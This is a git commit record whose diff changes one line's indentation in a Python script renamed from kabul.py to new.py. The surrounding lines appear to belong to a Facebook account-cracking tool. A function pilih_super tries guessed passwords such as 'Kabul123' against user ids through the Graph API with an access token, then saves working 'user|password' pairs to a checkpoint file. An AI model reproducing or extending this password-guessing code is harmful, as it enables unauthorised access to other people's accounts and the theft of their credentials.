138250a7b01357b2267bb0969c12ae92430e03b6
alizada7 <62267460+alizada7@users.noreply.github.com>
2020-04-07 05:43:26 +0430

    Update and rename kabul.py to new.py

--- new.py
+++ new.py
@@ -398,7 +398,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-															else:
+																else:
 																	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 																	b = json.loads(a.text)
 																	pass8 = ('Kabul123')
